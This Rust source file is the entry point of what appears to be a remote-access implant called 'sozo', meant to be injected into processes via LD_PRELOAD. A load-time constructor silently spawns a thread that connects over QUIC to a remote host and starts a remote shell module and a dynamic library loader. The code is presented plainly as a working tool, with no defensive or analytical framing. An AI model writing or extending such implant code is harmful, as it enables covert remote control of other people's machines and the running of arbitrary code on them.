pub mod bus;
pub mod loader;
mod quic;
pub mod shell;

use ctor::ctor;
use sozo_api::sozo_debug;

fn sozo_init() {
    /* Configure default crypto provider */
    if quinn::rustls::crypto::ring::default_provider()
        .install_default()
        .is_err()
    {
        sozo_debug!("sozo_init", "unable to configure default crypto provider");
    }

    /*
     * Due to LD_PRELOAD, we are unaware of whether the tokio runtime has been instantiated
     * Checking whether runtime exists and if so, we obtain a handle to the runtime
     * If not, we execute the runtime ourselves and block on dispatch
     */
    let rt;
    let rt_handle = match tokio::runtime::Handle::try_current() {
        Ok(handle) => handle,
        Err(_) => {
            sozo_debug!(
                "sozo_init",
                "runtime does not exist, attempting to instantiate a new tokio runtime"
            );
            rt = match tokio::runtime::Runtime::new() {
                Ok(rt) => rt,
                Err(_) => {
                    sozo_debug!(
                        "sozo_init",
                        "error while attempting to create tokio runtime"
                    );
                    return;
                }
            };

            rt.handle().clone()
        }
    };

    let _ = rt_handle.block_on(async {
        let mut quic = quic::Quic::new();

        let result = quic.connect().await;
        if result.is_err() {
            sozo_debug!("sozo_init", "unable to connect to remote host");
            return;
        }

        let mut bus = bus::Bus::new();
        let Some(shell) = shell::Shell::new() else {
            sozo_debug!("sozo_init", "unable to load shell module");
            return;
        };
        let loader = loader::LibraryLoader::new();

        if !bus.register(Box::new(quic)) {
            sozo_debug!("sozo_init", "unable to register Comms module");
            return;
        }

        if !bus.register(Box::new(shell)) {
            sozo_debug!("sozo_init", "unable to register Shell module");
            return;
        }

        if !bus.register(Box::new(loader)) {
            sozo_debug!("sozo_init", "unable to register LibraryLoader module");
            return;
        }

        if !bus.start_modules() {
            sozo_debug!("sozo_init", "unable to start modules");
            return;
        }

        sozo_debug!(
            "sozo_init",
            "modules have been started -- starting bus dispatcher"
        );

        bus.dispatch().await;

        sozo_debug!("sozo_init", "returned from dispatch");
    });
}

#[ctor(unsafe)]
fn init() {
    sozo_debug!("ctor", "sozo_init()");
    std::thread::spawn(|| {
        sozo_init();
    });
}

//TODO: Configure named sephamore to avoid multiple loads of shared object
//TODO: Go through and add debug lines in all failing cases within shell for tracking purposes
